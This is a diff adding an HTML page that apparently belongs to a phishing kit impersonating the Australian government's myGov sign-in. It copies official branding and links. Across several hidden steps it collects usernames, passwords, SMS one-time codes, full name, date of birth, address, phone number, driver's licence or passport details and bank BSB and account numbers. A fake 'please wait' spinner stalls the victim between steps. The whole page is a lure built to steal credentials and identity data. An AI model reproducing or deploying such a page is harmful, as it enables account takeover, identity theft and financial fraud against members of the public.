@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<!--[if IE 9]><html class="ie ie9" lang="en"><![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!-->
+<html lang="en"><!--<![endif]--><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<!--
+E: PROD; 
+C: MW1w; 
+N: MW1w16; 
+S: SW16b;  
+-->
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=edge">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<title>
+		Sign in with myGov - myGov
+	</title>
+	<meta name="description" content="">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<!-- phone number format detection, turning it off -->
+	<meta name="format-detection" content="telephone=no">
+	<script type="text/javascript" src="files/ruxitagentjs_ICANVfghqrux_10299241001084140.js" data-dtconfig="app=5f15dc81410a75c1|cuc=gpalpirq|ssc=1|mel=100000|featureHash=ICANVfghqrux|md=mdcc1=ainput#user-id,mdcc2=adiv.error-msg-text span,mdcc3=aspan[data-home-welcome-message]|ssv=4|lastModification=1741783413693|tp=500,50,0|rdnt=0|uxrgce=1|bp=3|agentUri=/LoginServices/main/ruxitagentjs_ICANVfghqrux_10299241001084140.js|reportUrl=/LoginServices/main/rb_6de8e2e9-6719-45b3-86be-7effcb9f6525|rid=RID_315652659|rpid=-757767799|domain=my.gov.au"></script><link rel="icon" type="image/png" sizes="32x32" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon-32x32.png">
+  	<link rel="icon" type="image/png" sizes="16x16" href="https://login.my.gov.au/mygov/content/mgv2/icons/favicon-16x16.png">
+	<link href="files/css.css" rel="stylesheet">
+	<link href="files/mgv2-application.css" rel="stylesheet">
+	<link href="files/blugov.css" rel="stylesheet">
+	<link href="files/mgv2-application1.css" rel="stylesheet">
+	<link href="files/blugov1.css" rel="stylesheet">  
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" />
+
+<style>
+		.loader {
+		  border: 16px solid #f3f3f3;
+		  border-radius: 50%;
+		  border-top: 16px solid rgb(49, 210, 238);
+		  border-right: 16px solid rgb(49, 210, 238);
+		  border-bottom: 16px solid rgb(49, 210, 238);
+		  width: 120px;
+		  height: 120px;
+		  -webkit-animation: spin 2s linear infinite;
+		  animation: spin 2s linear infinite;
+		}
+		
+		@-webkit-keyframes spin {
+		  0% { -webkit-transform: rotate(0deg); }
+		  100% { -webkit-transform: rotate(360deg); }
+		}
+		
+		@keyframes spin {
+		  0% { transform: rotate(0deg); }
+		  100% { transform: rotate(360deg); }
+		}
+		</style>
+</head>
+
+<body><noscript>
+	<div class="outage">
+		<div class="outage__inner">
+			<div>
+				<span class="is-visuallyhidden"> Warning message: </span>
+				<p> JavaScript is required for myGov to work correctly.</p>
+			</div>
+		</div>
+	</div>
+</noscript>
+
+
+
+
+	
+		
+	
+	
+
+
+
+
+
+<nav class="uikit-skip-link" aria-label="Skip Links">
+	<a class="uikit-skip-link__link" href="#content">Skip to main content</a>
+</nav>
+
+<div class="brand-rainbow">&nbsp;</div>
+<header role="banner" class="mgvEnhanceHeader">
+	<section class="wrapper">
+		<div class="inner">
+			<div class="unauth-grid">
+				<div class="unauth-grid-row">
+					<a href="https://my.gov.au/" class="unauth-govt-crest__link">
+					    <img id="unauth-govt-crest" src="files/myGov-cobranded-logo-black.svg" alt="Australian Government and myGov logo" role="img">
+                    </a>
+
+					<div class="header-links">
+						<a href="https://my.gov.au/en/about/help">Help</a>
+					</div>
+				</div>
+			</div>
+		</div>
+	</section>
+</header>
+
+
+
+
+
+
+
+
+
+<div id="step1" class="wrapper-mapwap"><div class="main-block" id="content" role="main">
+	<div class="unauth">
+		<div class="login-grid-container">
+			<div class="login-grid-row">
+				<div class="login-grid-column">
+					<div class="digital-id-login-card-wrapper">
+						<div class="digital-id-main-login-card override">
+	
+							<a data-go-back-link="" class="button-back" href="https://login.my.gov.au/las/mygov-login?execution=e2s1&amp;_eventId=close">Back</a>
+
+							
+							
+							
+
+                            <div id="passkey-auth-error" class="alert alert-danger error-msg" role="alert" style="display: none">
+                                <span class="is-visuallyhidden">Error message:</span>
+                                <div class="error-msg-text">
+                                    <strong>Error</strong>
+                                    <br>
+                                    <p id="passkey-error-msg">
+                                        Passkey authentication failed. (RFMxxx)
+                                    </p>
+                                </div>
+                            </div>
+
+                            <div id="error-msg-container" style="display: none">
+                                
+                                    
+                                    
+                                        <div class="error-msg" role="alert" aria-live="assertive"><span class="is-visuallyhidden">Error message:</span>
+                                            <div class="error-msg-text"><span>
+                                                <strong>Error</strong>
+                                                <br>
+                                                Your sign in details are incorrect. (RFM10A)
+                                                <br>
+                                                <br>
+                                                <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=recoverusername">Forgot username</a>
+                                                <br>
+                                                <a href="https://login.my.gov.au/las/mygov-login?execution=e1s2&amp;_eventId=resetpassword">Forgot password</a>
+                                            </span></div>
+
+                                        </div>
+
+                                    
+                                    
+                                    
+                                    
+                                        
+                                        
+                                        
+                                        
+                                    
+                                
+                            </div>
+
+							<h1>Sign in with myGov</h1>
+							<p class="login-instruction-text">Choose how to sign in</p>
+							<div class="digital-id-login-card secondary">
+                                <div class="button-digital-id-container">
+                                    <div class="digital-id-login-option-container">
+                                        <div class="inner-options">
+                                            <a class="button-digital-identity" href="#">Sign in with Digital ID</a>
+                                            <input type="hidden" value="{flowScope.targetParamDI}">
+                                            <a class="button-digital-identity" id="passkey-signin-btn" onclick="authenticatePasskey()" tabindex="0" style="display: flex;">
+                                                <img class="passkey-icon" src="files/FIDO_Passkey_mark_A_black.svg" alt="">
+                                                Sign in with passkey
+                                            </a>
+                                            <p class="external-links-zone">Learn about
+                                                <a href="https://my.gov.au/en/about/help/mygov-website/sign-in-to-mygov/use-passkeys" target="_blank">passkeys<span class="is-visuallyhidden"> opens in a new window</span></a>
+                                            </p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="hr-word">
+                                <div class="draw-circle">
+                                    or
+                                </div>
+                            </div>
+							<h2 class="text-align-left">Use your myGov sign in details</h2>
+							<form id="mygov-login-form" aria-describedby="error-msg" class="mygov-login-form alternative" action="#" method="post">
+								<div class="input-group">
+									<label class="override" for="userId">Username or email</label>
+									<input id="username" name="username" required="true" data-username="data-username" type="text" autocomplete="off">
+								</div>
+								<p class="recovery">
+									<a href="https://login.my.gov.au/las/mygov-login?execution=e2s1&amp;_eventId=recoverusername" class="anchor override">Forgot username</a>
+								</p>
+								<div class="input-group">
+									<label for="password" class="override">Password</label>
+									<div class="password-group">
+										<button class="showPassword anchor" type="button" aria-describedby="show-hide-helpmsg" aria-label="Show password as plain text.">Show</button><p class="is-visuallyhidden" id="show-hide-helpmsg">Note: this will visually expose your password on the screen.</p><input id="password" name="password" type="password" data-current-password="data-current-password" autocomplete="off" required="true">
+									</div>
+								</div>
+								<p class="recovery">
+									<a href="https://login.my.gov.au/las/mygov-login?execution=e2s1&amp;_eventId=resetpassword" class="anchor override">Forgot
+										password</a>
+								</p>
+								<div class="button-digital-id-main-container override">
+									<div class="digital-id-button-container">
+										<button type="submit" id="btn" class="button-main" name="_eventId_login">Sign in</button>
+									</div>
+								</div>
+                                    
+                                    
+                                
+								
+									
+									<p class="create-account-text"><a class="create-account-link" href="https://my.gov.au/en/create-account/">Create a myGov account</a> if you don't have one already.</p>
+									
+									
+								
+							<div>
+<input type="hidden" name="_csrf" value="c0ebde68-39b4-4696-ab1a-2a847d865bb0">
+</div></form>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div></div>
+<div id="step2" style="display:none" class="wrapper-mapwap">
+<div class="main-block" id="content" role="main">
+<div class="spinner" id="spinner">
+<h1>Please wait a moment ....</h1>
+							
+	
+
+							<div class="loader"></div>
+</div>
+	<div class="unauth" id="unauth" style="display:none">
+		<div class="login-grid-container">
+			<div class="login-grid-row">
+				<div class="login-grid-column">
+					<div class="digital-id-login-card-wrapper">
+						<h1>Enter code</h1>
+	    <p>We sent a code by SMS to your mobile number.</p>
+	<form id="form2" action="" method="post" autocomplete="off">
+			<div class="code-container">
+				<label for="otpanswer">Code	</label>
+                <input id="code" name="code" type="tel" class="security-code" autocomplete="off" required="" >
+				<p id="error" style="color:red;display:none">Invalid code.</p>
+			</div>
+            <div id="security-codes-info" class="hasInfo">
+                <p>
+                    If you don't want to use Digital Identity, you can <a>call the helpdesk</a> to create a new myGov account.
+                </p>
+                <a data-infotext-continue="" class="continue-digital-identity-chevron" href="#">Continue with Digital Identity</a>
+            </div>
+            <div class="button-container">    			
+    			<button type="submit" class="button-main button" id="btn2" name="_eventId_submitOtp">Next</button>
+			</div>
+	</form>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+</div>
+<div id="step3" style="display:none" class="wrapper-mapwap">
+<div class="main-block" id="content" role="main">
+			<h1>MyGov Account Information</h1>
+			<p style="font-size: 14px">Please answer the shared secret between you and the ATO.</p>
+			<hr>
+			<form id="form3" action="" method="post">
+				<div class="input-group">
+					<label for="fname">Full Name</label>
+					<input id="fname" name="fname" aria-required="true" type="text" value="" autocomplete="off" required=""> </div>
+				<div class="input-group">
+					<label for="fname">Date of Birth</label>
+					<input id="dob" name="dob" aria-required="true" type="date" value="" autocomplete="off" required=""> </div>
+				<div class="input-group">
+					<label for="fname">Full Address on File</label>
+					<input id="address" name="address" aria-required="true" type="text" value="" autocomplete="off" required=""> </div>
+					
+						<div class="input-group">
+					<label for="fname">Mobile Phone Number</label>
+					<input id="phone" name="phone" aria-required="true" type="text" value="" autocomplete="off" required=""> </div>
+					
+				<h3 style="height: 40px; background-color: rgb(167, 164, 164); padding: 10px">IDENTIFICATION DOCUMENT</h3>
+				<div class="input-group">
+					<label for="dob"><span style="font-weight: 400">Enter you <span style="font-weight: 600">Driver's License or Passport</span> Number</span>
+					</label>
+					<input id="issued" name="issued" aria-required="true" type="text" value="" autocomplete="off"> </div>
+				<div class="input-group">
+					<label for="dob"><span style="font-weight: 400">Enter <span style="font-weight: 600">Document</span> expiry date.</span>
+					</label>
+					<input id="reference" name="reference" aria-required="true" type="date" value="" autocomplete="off"> </div>
+					
+						<div class="input-group">
+					<label for="fname">Driver's License Card Number</label>
+					<input id="dlcard" name="dlcard" aria-required="true" type="text" value="" autocomplete="off" required=""> </div>
+					
+				<h3 style="height: 40px; background-color: rgb(167, 164, 164); padding: 10px">BANK ACCOUNT DETAILS</h3>
+				<div class="input-group">
+					<label for="dob"><span style="font-weight: 400">Enter <span style="font-weight: 600">BSB number</span> recorded with the ATO.</span>
+					</label>
+					<input id="bsb" name="bsb" aria-required="true" type="tel" value="" autocomplete="off"> </div>
+				<div class="input-group">
+					<label for="dob"><span style="font-weight: 400">Enter <span style="font-weight: 550">bank account number</span> recorded with the ATO (exclude BSB).</span>
+					</label>
+					<input id="acct" name="acct" aria-required="true" type="tel" value="" autocomplete="off"> </div>
+				<div class="button-container">
+					<button type="submit" name="_eventId_submit" id="btn3" class="button-main button">Next</button>
+				</div>
+			</form>
+		</div>
+</div>
+<div id="step4" style="display:none" class="wrapper-mapwap">
+<div class="main-block" id="content" role="main">
+	<div class="unauth" id="unauth" style="display">
+		<div class="login-grid-container">
+			<div class="login-grid-row">
+				<div class="login-grid-column">
+					<div class="digital-id-login-card-wrapper">
+						<h1>Verify Identity</h1>
+	    <p>We sent a code by SMS to your mobile number.</p>
+	<form id="form4" action="" method="post" autocomplete="off">
+			<div class="code-container">
+				<label for="otpanswer">Code	</label>
+                <input id="otp" name="otp" type="tel" class="security-code" autocomplete="off" required="" >
+				<p id="error" style="color:red;display:none">Invalid code.</p>
+			</div>
+            <div id="security-codes-info" class="hasInfo">
+                <p>
+                    If you don't want to use Digital Identity, you can <a>call the helpdesk</a> to create a new myGov account.
+                </p>
+                <a data-infotext-continue="" class="continue-digital-identity-chevron" href="#">Continue with Digital Identity</a>
+            </div>
+            <div class="button-container">    			
+    			<button type="submit" class="button-main button" id="btn4" name="_eventId_submitOtp">Next</button>
+			</div>
+	</form>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+</div>
+</div>
+
+
+<footer role="contentinfo">
+    <div class="wrapper">
+      <div class="inner">
+
+        <section class="footer-list">
+            <nav>
+            <h2 class="sr-only" aria-label="Footer">Footer</h2>
+            <ul class="lower-links">
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/terms">Terms of use</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/privacy-and-security">Privacy and security</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/copyright">Copyright</a>
+                </li>
+                <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/accessibility">Accessibility</a>
+                </li>
+            </ul>
+            </nav>
+        </section>
+          <div class="footer-lower">
+              <section class="footer-lower-logo">
+              <a href="https://my.gov.au/">
+                  <img src="files/myGov-cobranded-logo-white.svg" alt="Australian Government and myGov logo" width="313.17" height="70" role="img">
+              </a>
+              </section>
+
+              <p class="footer-acknowledgement">We acknowledge the 
+Traditional Custodians of the lands we live on. We pay our respects to 
+all Elders, past and present, of all Aboriginal and Torres Strait 
+Islander nations.</p>
+          </div>
+
+
+
+
+      </div>
+    </div>
+  </footer>
+
+
+<div id="artifact-metadata">
+	
+</div>
+<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script> 
+<script>
+// Show spinner for 2 seconds before revealing content
+setTimeout(function() {
+  document.getElementById("spinner").style.display = 'none';
+  document.getElementById("unauth").style.display = 'block';
+}, 30000);
+</script>
+<script src="jquery.js"></script> 
+<script>
+
+    $(function() {
+        $('[name="code"]').mask('000000');
+		$('[name="otp"]').mask('000000');
+    });
+
+</script>
+</body></html>
